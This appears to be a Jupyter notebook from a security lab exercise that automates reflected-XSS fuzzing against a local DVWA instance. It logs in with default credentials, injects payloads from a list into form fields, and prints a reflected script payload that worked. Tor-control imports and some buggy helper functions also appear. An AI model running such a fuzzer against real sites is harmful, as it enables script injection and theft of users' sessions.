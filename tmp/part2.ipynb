{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "floating-controversy",
   "metadata": {},
   "source": [
    "https://docs.python-requests.org/en/master/user/advanced/  \n",
    "https://realpython.com/python-requests/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "initial-hunger",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "import requests\n",
    "from requests_html import HTMLSession\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "try:\n",
    "    import urlparse\n",
    "    from urllib import urlencode\n",
    "except: # For Python 3\n",
    "    import urllib\n",
    "    from urllib.parse import urlparse, urlunparse, urljoin, urlencode, parse_qsl\n",
    "\n",
    "import colorama\n",
    "import random\n",
    "from stem.control import Controller\n",
    "from stem import Signal\n",
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "entitled-saying",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "accessible-polyester",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "pressing-representation",
   "metadata": {},
   "outputs": [],
   "source": [
    "def MyReadFile(path, encoding=None):\n",
    "    file = open( path, 'r', encoding=encoding)\n",
    "    filecontent = file.readlines()\n",
    "    file.close() \n",
    "    return filecontent"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "pretty-opinion",
   "metadata": {},
   "outputs": [],
   "source": [
    "def MyWriteFile(path, filecontent, encoding=None):\n",
    "    file = open( path, 'w', encoding=encoding)\n",
    "    file.writelines( filecontent )\n",
    "    file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "general-hypothesis",
   "metadata": {},
   "outputs": [],
   "source": [
    "# https://stackoverflow.com/questions/2506379/add-params-to-given-url-in-python\n",
    "def add_url_params(url, params={}):\n",
    "    url_parts = list(urlparse(url))\n",
    "    query = dict(parse_qsl(url_parts[4]))  # query = url_parts.query\n",
    "    query.update(params)\n",
    "    url_parts[4] = urlencode(query)\n",
    "    return urlunparse(url_parts)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "processed-gates",
   "metadata": {},
   "outputs": [],
   "source": [
    "def login(session, loginURL, payload):\n",
    "    r = session.get( loginURL )\n",
    "    signin = BeautifulSoup( r.content , \"html5lib\")\n",
    "    \n",
    "    try:\n",
    "        payload['user_token'] = signin.find('input', attrs={\"name\" : \"user_token\"} )['value']\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "    p = session.post( loginURL, data=payload )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "weighted-attention",
   "metadata": {},
   "outputs": [],
   "source": [
    "def login_dvwa(loginURL):\n",
    "    r = requests.get( loginURL )\n",
    "    print(r.headers)\n",
    "    \n",
    "    session_id = re.match(\"PHPSESSID=(.*?);\", r.headers[\"set-cookie\"])\n",
    "    session_id = session_id.group(1)\n",
    "    print(\"[X] Session_id: \" + session_id)\n",
    "    \n",
    "    cookie = {\"PHPSESSID\": session_id}\n",
    "    \n",
    "    signin = BeautifulSoup( r.text, \"html.parser\")\n",
    "    \n",
    "    user_token = signin.find(\"input\", {\"name\": \"user_token\"})[\"value\"]\n",
    "    print(\"[X] User_token: \" + user_token + \"\\n\")\n",
    "    \n",
    "    payload = {\"username\": \"admin\",\n",
    "               \"password\": \"password\",\n",
    "               \"Login\": \"Login\",\n",
    "               \"user_token\": user_token}\n",
    "    \n",
    "    req_login = requests.post(loginURL, payload, cookies=cookie,allow_redirects=False)\n",
    "    \n",
    "    print(req_login)\n",
    "    \n",
    "    result = req_login.headers[\"Location\"]\n",
    "    \n",
    "    if \"index.php\" in result:\n",
    "        return session_id\n",
    "    else:\n",
    "        print(\"Failed.\")\n",
    "        return"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "elder-reader",
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_request(url, payload, method, sessid):\n",
    "    if sessid == '':\n",
    "        sessid = login_dvwa()\n",
    "\n",
    "    s = requests.Session()\n",
    "    \n",
    "    cookie = {\n",
    "        \"PHPSESSID\": sessid,\n",
    "        \"security\": \"low\"\n",
    "    }\n",
    "    \n",
    "    if method == \"GET\":\n",
    "        res = s.get(url, params=payload, cookies=cookie, allow_redirects=False)\n",
    "    elif method == \"POST\":\n",
    "        res = s.post(url, data=payload, cookies=cookie, allow_redirects=False)\n",
    "    \n",
    "    print(res.status_code)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "dressed-boulder",
   "metadata": {},
   "outputs": [],
   "source": [
    "# https://github.com/chrisandoryan/Nethive-Project/blob/master/utils.py\n",
    "def replay_xss_payload_dataset(target):\n",
    "    print(\"Replaying XSS Payload dataset from https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt\")\n",
    "\n",
    "    param_name = 'name'\n",
    "\n",
    "    payloads = open('/home/MaliciousFormattedPayload.log', 'r', encoding=\"ISO-8859-1\").readlines()\n",
    "\n",
    "    send_count = 0\n",
    "    \n",
    "    sessid = login_dvwa()\n",
    "    for data in payloads:\n",
    "        x = data.split('#', 1)\n",
    "        idx = x[0]\n",
    "        payload = x[1]\n",
    "        print(x)\n",
    "        send_request(target, {param_name: payload, 'index': idx, 'Submit': 'Submit'}, \"GET\", sessid)\n",
    "        send_count += 1\n",
    "        time.sleep(1)\n",
    "    \n",
    "    print(\"Sent %d MALICIOUS requests.\" % send_count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "lyric-perspective",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "essential-investigator",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "broadband-tyler",
   "metadata": {},
   "outputs": [],
   "source": [
    "loginURL = \"http://127.0.0.1/login.php\"\n",
    "protectedURL = \"http://127.0.0.1/vulnerabilities/xss_r/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "clean-eating",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "perceived-wildlife",
   "metadata": {},
   "outputs": [],
   "source": [
    "s = requests.Session()\n",
    "# s.headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "documentary-championship",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Fill in your details here to be posted to the login form.\n",
    "payload = {\n",
    "    'username': 'admin',\n",
    "    'password': 'password',\n",
    "    'Login': 'Login'\n",
    "}\n",
    "\n",
    "login( s, loginURL, payload )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acoustic-crack",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "included-compact",
   "metadata": {},
   "outputs": [],
   "source": [
    "# An authorised request.\n",
    "r = s.get( protectedURL )\n",
    "html_doc = r.content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "czech-local",
   "metadata": {},
   "outputs": [],
   "source": [
    "soup = BeautifulSoup( html_doc , \"html5lib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "medical-plaintiff",
   "metadata": {},
   "outputs": [],
   "source": [
    "# soup.prettify"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "elect-bradford",
   "metadata": {},
   "outputs": [],
   "source": [
    "forms = soup.find_all('form')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "bearing-qualification",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "precious-upset",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "len file = 525\n",
      "len file = 420\n"
     ]
    }
   ],
   "source": [
    "XSSpayloads = MyReadFile( 'XSSpayload.txt', \"ISO-8859-1\" )\n",
    "\n",
    "print( f\"len file = {len(XSSpayloads)}\" )\n",
    "XSSpayloads = list(set( [ x[:-1] for x in XSSpayloads if x != '\\n'] ))\n",
    "print( f\"len file = {len(XSSpayloads)}\" )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "mental-forest",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "shaped-reduction",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "----- form 0 -----\n",
      "method = GET\n",
      "action = #\n",
      "\t(0) name = None & inputType = text\n",
      "name\n",
      "\tname=<svg><script ?>alert(1,\n",
      "\t\thttp://127.0.0.1/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript+%3F%3Ealert%281\n"
     ]
    }
   ],
   "source": [
    "for i, form in enumerate(forms): \n",
    "    print(f\"----- form {i} -----\")\n",
    "    formMethod = form.get('method')   # post / GET\n",
    "    formAction = form.get('action')   # login.php\n",
    "    formInputs = form.find_all('input')\n",
    "    \n",
    "    print(f\"method = {formMethod}\")\n",
    "    print(f\"action = {formAction}\")\n",
    "    \n",
    "    href = urljoin(protectedURL, formAction ) \n",
    "    params={}\n",
    "    \n",
    "    for j, formInput in enumerate(formInputs):\n",
    "        inputType = formInput.get('type') \n",
    "        inputName = formInput.get('name')\n",
    "        inputValue = formInput.get('value')\n",
    "        \n",
    "        if(inputType == \"submit\"):\n",
    "            continue\n",
    "        \n",
    "        params[inputName] = inputValue\n",
    "        \n",
    "        print(f\"\\t({j}) {inputName} = {inputValue} & inputType = {inputType}\")\n",
    "    \n",
    "    for key, value in params.items():\n",
    "        if( value == None ):\n",
    "            print(key)\n",
    "            \n",
    "            for data in XSSpayloads:\n",
    "                if(data=='\\n'):\n",
    "                    continue\n",
    "                params[key] = data[:-1]\n",
    "                \n",
    "                new_URL = add_url_params(href, params)\n",
    "\n",
    "                r_tmp = s.get( new_URL )\n",
    "                html_doc_tmp = r_tmp.text\n",
    "\n",
    "                if( data[:-1] in html_doc_tmp ):\n",
    "                    print( f\"\\t{key}={data[:-1]},\\n\\t\\t{new_URL}\" )\n",
    "                    break\n",
    "                \n",
    "            "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "hungarian-ratio",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "gorgeous-sandwich",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "higher-worship",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "exceptional-praise",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "sustained-blackjack",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "posted-sheep",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "consistent-bicycle",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "several-distribution",
   "metadata": {},
   "outputs": [],
   "source": [
    "s.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ranging-familiar",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "EnvSSD",
   "language": "python",
   "name": "envssd"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
